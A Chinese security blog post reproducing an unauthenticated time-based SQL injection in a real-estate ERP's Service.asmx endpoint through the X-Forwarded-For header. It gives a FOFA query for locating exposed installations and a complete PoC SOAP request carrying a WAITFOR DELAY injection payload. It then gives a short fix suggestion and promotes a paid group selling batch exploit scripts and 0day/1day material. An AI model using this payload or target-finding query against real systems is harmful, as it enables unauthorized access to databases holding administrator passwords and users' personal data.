#  「漏洞复现」某源地产ERP Service.asmx X-Forwarded-For注入漏洞   
冷漠安全  冷漠安全   2025-01-12 04:51  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
某源地产ERP是一款专门为房地产行业设计的企业资源规划（ERP）系统，旨在帮助房地产企业实现全面的信息化管理，提高运营效率和管理水平。系统涵盖了项目管理、财务管理、供应链管理、客户关系管理（CRM）、人力资源管理等多个核心功能模块，通过整合企业的各个业务环节，实现信息的统一管理和高效协同。该系统在房地产行业具有高度的专业性和适用性，能够满足不同规模和类型企业的需求。适用于各种规模和类型的房地产企业，特别是需要进行项目管理和资金管理的企业。无论是大型企业还是中小企业，都可以从某源地产ERP系统中受益。例如，大型企业可以利用系统的全面性和集成性，实现复杂的业务流程管理和数据分析；而中小企业则可以根据自身需求，选择适合的功能模块，优化资源配置，提高运营效率。  
  
0x03  
  
漏洞威胁  
  
某源地产ERP系统 WebService服务针对客户端IP权限校验时,未对X-Forwarded-For获取真实IP进行严格的过滤和校验，导致出现SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。  
  
0x04  
  
漏洞环境  
  
FOFA:  
```
body="/_common/scripts/md5-min.js"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qQQRNkEo8NMwRQ021eRZBqBuKH0CuQ7uEILDKfLck9mxaJjR8m82DzflBlIciaUThm2oe1chjiaaSg/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
POST /Kfxt/Service.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
X-Forwarded-For: 127.0.0.1');WAITFOR DELAY '0:0:4'--
SOAPAction: "http://www.mysoft.com.cn/queryProjects"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <queryProjects xmlns="http://www.mysoft.com.cn/">
      <inpXML>&lt;xml&gt;&lt;buname&gt;abc&lt;/buname&gt;&lt;/xml&gt;</inpXML>
    </queryProjects>
  </soap:Body>
</soap:Envelope>
```  
  
延时  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qQQRNkEo8NMwRQ021eRZBqtia5diaMouyFgIhPoUNLYEOxj9HXAjYV7XWuHACmMwG3xCQHvAczsGHQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qQQRNkEo8NMwRQ021eRZBq3ZUe1E0VMF3MlyJO2gHK6PMjFjMVcAQqiaXxIVcgI17MLPnBp9ibSpfw/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qQQRNkEo8NMwRQ021eRZBqt6FQo96bOGic9Q1GLIl7fia3cV1AZy2CLdvWnwwDV8iaP0M1gFuAzeqmQ/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qQQRNkEo8NMwRQ021eRZBqMxFaicuXYmyqib7U4Jfm3NuE6aVRSmCRmCLDGMhHF6rlfhxY8pOKt4TQ/640?wx_fmt=gif&from=appmsg "")  
  
  
